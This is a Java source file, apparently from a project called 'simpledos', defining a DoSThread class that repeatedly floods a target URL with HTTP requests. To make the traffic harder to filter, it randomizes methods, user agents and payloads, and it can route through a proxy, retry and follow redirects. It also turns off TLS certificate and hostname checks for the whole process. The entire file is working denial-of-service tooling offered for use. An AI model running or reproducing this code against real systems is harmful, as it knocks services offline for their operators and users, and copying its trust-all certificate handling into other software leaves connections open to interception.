package f76goat.simpledos;

import javax.net.ssl.*;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLEncoder;
import java.security.cert.X509Certificate;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;

public class DoSThread extends Thread {

    private final AtomicBoolean running = new AtomicBoolean(true);
    private final URL url;
    private final String param;
    private final int minRequestInterval;
    private final int maxRequestInterval;
    private final int timeout; // Added timeout variable
    private final int maxRetries = 3; // Maximum number of retries
    private final Random random;
    private final int maxRedirects = 5;
    private final Proxy proxy;

    public DoSThread(String requestUrl, int minRequestInterval, int maxRequestInterval, int timeout, Proxy proxy) throws MalformedURLException, UnsupportedEncodingException {
        this.url = new URL(ensureProtocol(requestUrl));
        this.param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        this.minRequestInterval = minRequestInterval;
        this.maxRequestInterval = maxRequestInterval;
        this.timeout = timeout; // Initialize timeout
        this.random = new Random();
        this.proxy = proxy;

        // Ignore SSL certificate validation
        ignoreSSLCertificateValidation();
    }

    @Override
    public void run() {
        while (running.get()) {
            try {
                long startTime = System.currentTimeMillis();
                int responseCode = attack(url, 0);
                long endTime = System.currentTimeMillis();
                long responseTime = endTime - startTime;

                System.out.println(this + " Response Code: " + responseCode + " Response Time: " + responseTime + "ms");

                if (responseCode != 200) {
                    System.out.println("Server might be down or experiencing issues");
                }

                Thread.sleep(random.nextInt(maxRequestInterval - minRequestInterval) + minRequestInterval);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public int attack(URL targetUrl, int redirectCount) throws Exception {
        if (redirectCount > maxRedirects) {
            throw new Exception("Too many redirects");
        }

        int attempt = 0;
        while (attempt < maxRetries) {
            try {
                HttpURLConnection connection = (HttpURLConnection) (proxy != null ? targetUrl.openConnection(proxy) : targetUrl.openConnection());
                connection.setConnectTimeout(timeout); // Set connection timeout
                connection.setReadTimeout(timeout); // Set read timeout
                connection.setInstanceFollowRedirects(false); // Disable automatic redirects
                connection.setDoOutput(true);
                connection.setDoInput(true);
                String method = getRandomHttpMethod();
                connection.setRequestMethod(method);
                connection.setRequestProperty("charset", "utf-8");
                connection.setRequestProperty("User-Agent", getRandomUserAgent());
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                if ("POST".equals(method) || "PUT".equals(method)) {
                    String payload = getRandomPayload();
                    byte[] postData = payload.getBytes("UTF-8");
                    connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
                    try (OutputStream os = connection.getOutputStream()) {
                        os.write(postData);
                    }
                }

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {
                    String location = connection.getHeaderField("Location");
                    URL newUrl = constructNewUrl(targetUrl, location);
                    return attack(newUrl, redirectCount + 1);
                }

                connection.getInputStream().close();
                connection.disconnect();
                return responseCode;
            } catch (SocketTimeoutException | ConnectException e) {
                attempt++;
                System.err.println("Connection attempt " + attempt + " failed: " + e.getMessage());
                if (attempt >= maxRetries) {
                    throw e;
                }
                Thread.sleep(1000); // Wait before retrying
            }
        }
        throw new Exception("Failed to connect after " + maxRetries + " attempts");
    }

    private URL constructNewUrl(URL originalUrl, String location) throws MalformedURLException {
        if (location.startsWith("http://") || location.startsWith("https://")) {
            return new URL(location);
        } else {
            return new URL(originalUrl.getProtocol(), originalUrl.getHost(), originalUrl.getPort(), location);
        }
    }

    private String getRandomUserAgent() {
        String[] userAgents = {
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15"
        };
        int index = random.nextInt(userAgents.length);
        return userAgents[index];
    }

    private String getRandomHttpMethod() {
        String[] httpMethods = {"GET", "POST", "HEAD", "OPTIONS"};
        int index = random.nextInt(httpMethods.length);
        return httpMethods[index];
    }

    private String getRandomPayload() throws UnsupportedEncodingException {
        String[] payloads = {
            "param1=" + URLEncoder.encode("87845", "UTF-8"),
            "param2=" + URLEncoder.encode("12345", "UTF-8"),
            "param3=" + URLEncoder.encode("67890", "UTF-8")
        };
        int index = random.nextInt(payloads.length);
        return payloads[index];
    }

    public void stopRunning() {
        running.set(false);
    }

    private void ignoreSSLCertificateValidation() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }

                    public void checkClientTrusted(X509Certificate[] certs, String authType) {
                    }

                    public void checkServerTrusted(X509Certificate[] certs, String authType) {
                    }
                }
            };

            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HostnameVerifier allHostsValid = (hostname, session) -> true;
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String ensureProtocol(String url) {
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            return "http://" + url;
        }
        return url;
    }
}
